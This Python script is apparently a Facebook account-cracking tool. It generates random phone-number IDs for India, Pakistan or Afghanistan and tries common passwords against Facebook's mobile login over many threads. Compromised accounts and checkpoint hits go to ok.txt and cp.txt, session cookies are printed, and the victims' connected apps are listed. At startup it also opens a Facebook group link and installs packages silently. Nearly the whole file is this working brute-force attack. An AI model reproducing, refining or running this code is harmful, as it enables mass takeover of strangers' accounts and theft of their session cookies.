#create by mirwais danishyar 

import os
os.system('xdg-open https://m.facebook.com/groups/1430148900897205/?ref=share&mibextid=NSMWBT')


try:

	import requests

except ImportError:

	print('\n [×] requests module not installed!...\n')

	os.system('pip install requests')



try:

	import concurrent.futures

except ImportError:

	print('\n [×] Futures module not installed!...\n')

	os.system('pip install futures')

    

try:

	import bs4

except ImportError:

	print('\n [×] Bs4 module not installed!...\n')

	os.system('pip install bs4')

    

import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,uuid

from bs4 import BeautifulSoup as sop

from concurrent.futures import ThreadPoolExecutor as tred

import base64

import os,sys,time,json,random,re,string,platform,base64

try:

	import requests

	from concurrent.futures import ThreadPoolExecutor as ThreadPool

	import mechanize

	from requests.exceptions import ConnectionError

except ModuleNotFoundError:

	os.system('pip install mechanize requests futures==2 > /dev/null')

	os.system('python num.py')

  

agents = [
'Mozilla/5.0 (Linux; U; Android 1.6; ar-us; SonyEricssonX10i Build/R2BA026) AppleWebKit/528.5+ (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',

'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5'

'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; ko; rv:1.9.1b2) Gecko/20081201 Firefox/3.1b2'

'Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.9b5) Gecko/2008032620 Firefox/3.0b5'

'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.12) Gecko/20080214 Firefox/2.0.0.12'

'Mozilla/5.0 (Windows; U; Windows NT 5.1; cs; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8'

'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.8.0.5) Gecko/20060819 Firefox/1.5.0.5'

'Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3'

'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5'

'Mozilla/5.0 (Windows; Windows NT 6.1; rv:2.0b2) Gecko/20100720 Firefox/4.0b2'

'Mozilla/5.0 (X11; Linux x86_64; rv:2.0b4) Gecko/20100818 Firefox/4.0b4'

'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2) Gecko/20100308 Ubuntu/10.04 (lucid) Firefox/3.6 GTB7.1'

'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7) Gecko/20101111 Firefox/4.0b7'

'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b8pre) Gecko/20101114 Firefox/4.0b8pre'

'Mozilla/5.0 (X11; Linux x86_64; rv:2.0b9pre) Gecko/20110111 Firefox/4.0b9pre'

'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b9pre) Gecko/20101228 Firefox/4.0b9pre'

'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.2a1pre) Gecko/20110324 Firefox/4.2a1pre'

'Mozilla/5.0 (X11; U; Linux amd64; rv:5.0) Gecko/20100101 Firefox/5.0 (Debian)'

'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110613 Firefox/6.0a2'

'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:12.0) Gecko/20100101 Firefox/12.0'

'Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20120716 Firefox/15.0a2'

'Mozilla/5.0 (X11; Ubuntu; Linux armv7l; rv:17.0) Gecko/20100101 Firefox/17.0'

'Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130328 Firefox/21.0'

'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0'

'Mozilla/5.0 (Windows NT 5.1; rv:25.0) Gecko/20100101 Firefox/25.0'

'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:25.0) Gecko/20100101 Firefox/25.0'

'Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0'

'Mozilla/5.0 (X11; Linux i686; rv:30.0) Gecko/20100101 Firefox/30.0'

'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0'

'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0'

'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0'

'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:58.0) Gecko/20100101 Firefox/58.0'

'Opera/5.11 (Windows 98; U) [en]'

'Mozilla/4.0 (compatible; MSIE 5.0; Windows 98) Opera 5.12 [en]'

'Opera/6.0 (Windows 2000; U) [fr]'

'Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0) Opera 6.01 [en]'

'Opera/7.03 (Windows NT 5.0; U) [en]'

'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.10 [en]'

'Opera/9.02 (Windows XP; U; ru)'

'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.24'

'Opera/9.51 (Macintosh; Intel Mac OS X; U; en)'

'Opera/9.70 (Linux i686 ; U; en) Presto/2.2.1'

'Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.2.15 Version/10.00'

'Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01'

'Opera/9.80 (Windows NT 6.1; U; en-GB) Presto/2.7.62 Version/11.00'

'Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01'

'Opera/9.80 (Windows NT 6.0; U; en) Presto/2.8.99 Version/11.10'

'Opera/9.80 (X11; Linux i686; U; ru) Presto/2.8.131 Version/11.11'

'Opera/9.80 (Windows NT 5.1) Presto/2.12.388 Version/12.14'

'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.12 Safari/537.36 OPR/14.0.1116.4'

'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.29 Safari/537.36 OPR/15.0.1147.24 (Edition Next)'

'Opera/9.80 (Linux armv6l ; U; CE-HTML/1.0 NETTV/3.0.1;; en) Presto/2.6.33 Version/10.60'

'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36 OPR/20.0.1387.91'

'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Oupeng/10.2.1.86910 Safari/534.30'

'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'

'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2376.0 Safari/537.36 OPR/31.0.1857.0'

'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 OPR/32.0.1948.25'

'Mozilla/5.0 (iPad; CPU OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mobile/10A523 [FBAN/FBIOS;FBAV/6.0.1;FBBV/180945;FBDV/iPad2,1;FBMD/iPad;FBSN/iPhone OS;FBSV/6.0.1;FBSS/1; FBCR/;FBID/tablet;FBLC/en_US;FBOP/1]'

'Mozilla/5.0 (Linux; Android 4.4.2; VS880 Build/KOT49I.VS88012A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/28.0.0.20.16;]'

'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'

"Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+",

"Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.5.10 NintendoBrowser/5.1.0.13343",

"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02",

"Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36",] 

logo = """
\033[1;32m
\033[1;33m >=======> >=> >======>     >=======> 🇮🇳
\033[1;36m >=>       >=> >=>    >=>   >=>       
\033[1;31m >=>       >=> >=>    >=>   >=>       
\033[1;32m >=====>   >=> >> >==>      >=====>   
\033[1;34m >=>       >=> >=>  >=>     >=>       
\033[1;33m >=>       >=> >=>    >=>   >=>       
\033[1;31m >=>       >=> >=>      >=> >=======> 🇵🇰
                                     
\33[37;41m\t WELLCOME TO SAHIL X SAMI TOOL\33[0;m

\033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
\033[1;93m▇▇➣    \033[1;91mAUTHOR   : SAHIL X SAMI    \033[1;93m
\033[1;93m▇▇➣    \033[1;94mGITHUB   : SAHIL-KHAN-404     \033[1;93m     
\033[1;93m▇▇➣    \033[1;93mFACEBOOK : SAHIL KHAN    \033[1;93m    
\033[1;93m▇▇➣    \033[1;92mWHATSAPP : USE NA KARTA \033[1;93m
\033[1;93m▇▇➣    \033[1;96mVERSION  : 0.2       \033[1;93m
\033[1;93m▇▇➣     \033[1;91mTHIS TOOL IS FREE       \033[1;93m       
\033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇

"""  

loop = 0

oks = []

cps = []



#global functions

def dynamic(text):

	titik = ['.   ','..  ','... ','.... ']

	for o in titik:

		print('\r'+text+o),

		sys.stdout.flush();time.sleep(1)





		

def menu():

	os.system('clear')

	print(logo)

	print(47*"-")

	print('\033[1;33[1] RANDOM CRACK')
	

	print(47*"-")

	opt = input('\033[1;37[?] CHOOSE : ')

	if opt =='1':

		random_crack()



def cek_apk(coki):

    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))

    else:

        print(f'\r ÃƒÂ°Ã…Â¸Ã…Â½Ã‚Â®  %sYour Active Application Details :'%(H))

        for i in range(len(game)):

            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

        #else:

            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))

    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))

    else:

        print(f'\r[Ã°Å¸Å½Â®] %s \x1b[1;95m Ã¢â€”â€¡ Your Expired Apps Ã¢â€”â€¡    :{WHITE}'%(M))

        for i in range(len(game)):

            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

        else:

            print(f'\r')

            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))

   

def random_crack():

	os.system('clear')

	print(logo)

	print(47*"-")

	print('\033[1;34[1] INDIA RANDOM uid CRACK')
	

	print('\033[1;33[2] PAK AND AFG RANDOM uid CRACK')
	

	print('\033[1;37[3] FILE CLONE')

	print(47*'-')

	opt = input('[?] CHOOSE : ')

	if opt =='1':

		random_number()

	elif opt =='2':

		random_pak_number()

	elif opt =='0':

		menu()

	else:

		print('\033[1;91mCHOOSE VALID OPTION\033[0;97m')
		



def random_number():

	user=[]

	os.system('clear')

	print(logo)

	print(47*"-")

	print('[+] FOR INDIAN ENTER FOUR DIGIT CODE (7666) (9934) (9871) (9650) (6353') 
	

	print(47*'-')

	kode = input('[?] INPUT CODE : ')

	print(47*'-')

	limit = int(input('[?]  CHOOSE LIMT 5000,3000,2000,10000, : '))
	
	

	for nmbr in range(limit):

		nmp = ''.join(random.choice(string.digits) for _ in range(6))

		user.append(nmp)

	with ThreadPool(max_workers=30) as yaari:

		os.system('clear')

		print(logo)

		tl = str(len(user))

		print('[+] TOTAL IDS : \033[1;92m'+tl)
		

		print('\033[1;37;1m[$] BRUTE HAS BEEN STARTED...(\033[1;94mINDIA\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		

		for guru in user:

			uid = kode+guru
			mk = uid[:6]
			pwx = [kode+guru,mk,'free fire','i love you','57273200']
			mk = uid[:6]
			pwx = [guru]
			pwx = [kode+guru,mk,'free fire','i love you','57273200']

			yaari.submit(rcrack,uid,pwx,tl)

	print(47*"-")

	print('[âœ“] Crack process has been completed')

	print('[?] IDS SAVED IN SAHIL OK.txt,cp.txt')

	print(47*"-")

	print(' Press Inter To Back Menu')

	menu()
	

    

def rcrack(uid,pwx,tl):

	global loop

	global oks

	global agents

	try:

		for ps in pwx:

			session = requests.Session()

			pro = random.choice(agents)

			free_fb = session.get('https://free.facebook.com').text

			log_data = {

				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

			"try_number":"0",

			"unrecognized_tries":"0",

			"email":uid,

			"pass":ps,

			"login":"Log In"}

			header_freefb = {'authority': 'x.facebook.com',
			
            'method': 'POST',
            
			'scheme': 'https',
			
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',

            'accept-language': 'en-US,en;q=0.9',

            'cache-control': 'max-age=0',

            'dpr': '2',

            'save-data': 'on',

            'sec-ch-prefers-color-scheme': 'light',

            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',

            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',

            'sec-ch-ua-mobile': '?1',

            'sec-ch-ua-model': '"vivo 1901"',

            'sec-ch-ua-platform': '"Android"',

            'sec-ch-ua-platform-version': '"11.0.0"',

            'sec-fetch-dest': 'document',

            'sec-fetch-mode': 'navigate',

            'sec-fetch-site': 'none',

            'sec-fetch-user': '?1',

            'upgrade-insecure-requests': '1',
 
            'user-agent': 'Mozilla/5.0 (Linux; Android 8.0.0; BZT-AL00 Build/HUAWEIBZT-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36;]',}

			lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text

			log_cookies=session.cookies.get_dict().keys()

			#print(iid+'|'+pws+'|'+str(log_cookies))

			if 'c_user' in log_cookies:

				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

				uid = coki[151:166]

				print('\r\033[1;32m[SAHIL-OK] '+uid+' | '+ps)

				cek_apk(coki)

				open('ok.txt', 'a').write(uid+' | '+ps+'\n')

				oks.append(uid)

				break

			elif 'checkpoint' in log_cookies:

				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

				uid = coki[141:152]

				print('\r\033[1;31m[SAHIL-CP] '+uid+' | '+ps)

				open('cp.txt', 'a').write(uid+' | '+ps+'\n')

				cps.append(uid)

				break

			else:

				continue

		loop+=1

		sys.stdout.write(f"\r\x1b[1;32m[ SAHIL ]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [Cp][{len(cps)}] ")

		sys.stdout.flush()

	except:

		pass



def random_pak_number():

	user=[]

	os.system('clear')

	print(logo)

	print(47*"-")

	print('[+] For PAK Code(92301) For AFG Code(93780) ETC...')

	print(47*'-')

	kode = input('[?] Input Code : ')

	print(47*'-')

	limit = int(input('[?] How many numbers to add 1000,5000,100000: '))

	for nmbr in range(limit):

		nmp = ''.join(random.choice(string.digits) for _ in range(7))

		user.append(nmp)

	with ThreadPool(max_workers=30) as yaari:

		os.system('clear')

		print(logo)

		tl = str(len(user))

		print('[+] Total Ids : \033[1;92m'+tl)

		print('\033[1;37;1m[$] Brute Has been started...(\033[1;92mPak-Afg\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")

		for guru in user:

			uid = kode+guru

			pwx = [guru,'khan123','khankhan','khan1234','khan12345']

			yaari.submit(rcrack,uid,pwx,tl)

	print(47*"-")

	print('[✓] Crack process has been completed')

	print('[?] Ids saved in SAHIL ok.txt,cp.txt')

	print(47*"-")

	print(' Press Inter To Back Menu')

	menu()

    

def rcrack(uid,pwx,tl):

	global loop

	global oks

	global agents

	try:

		for ps in pwx:

			session = requests.Session()

			pro = random.choice(agents)

			free_fb = session.get('https://free.facebook.com').text

			log_data = {

				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

			"try_number":"0",

			"unrecognized_tries":"0",

			"email":uid,

			"pass":ps,

			"login":"Log In"}

			header_freefb = {'authority': 'p.facebook.com',
			
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    
    'cache-control': 'max-age=0',
    
    'dpr': '2.75',
    
    'sec-ch-prefers-color-scheme': 'light',
    
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    
    'sec-ch-ua-mobile': '?1',
    
    'sec-ch-ua-model': '"V2127"',
    
    'sec-ch-ua-platform': '"Android"',
    
    'sec-ch-ua-platform-version': '"13.0.0"',
    
    'sec-fetch-dest': 'document',
    
    'sec-fetch-mode': 'navigate',
    
    'sec-fetch-site': 'none',
    
    'sec-fetch-user': '?1',
    
    'upgrade-insecure-requests': '1',
    
    'user-agent': 'Mozilla/5.0 (Linux; Android 11.0; BZT-AL00 Build/HUAWEIBZT-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.22 Safari/537.36;]',}

			lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text

			log_cookies=session.cookies.get_dict().keys()

			#print(iid+'|'+pws+'|'+str(log_cookies))

			if 'c_user' in log_cookies:

				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

				uid = coki[151:166]

				print('\r\033[1;32m[SAHIL-FIRE🥰] '+uid+' | '+ps)

				print(f" Cookie : {coki}")

				open('ok.txt', 'a').write(uid+' | '+ps+'\n')

				oks.append(uid)

				break

			elif 'checkpoint' in log_cookies:

				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

				uid = coki[141:152]

				

				open('cp.txt', 'a').write(uid+' | '+ps+'\n')

				cps.append(uid)

				break

			else:

				continue

		loop+=1

		sys.stdout.write('\r\33[1;37m[OP-SAHIL] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),

		sys.stdout.flush()

	except:

		pass


menu()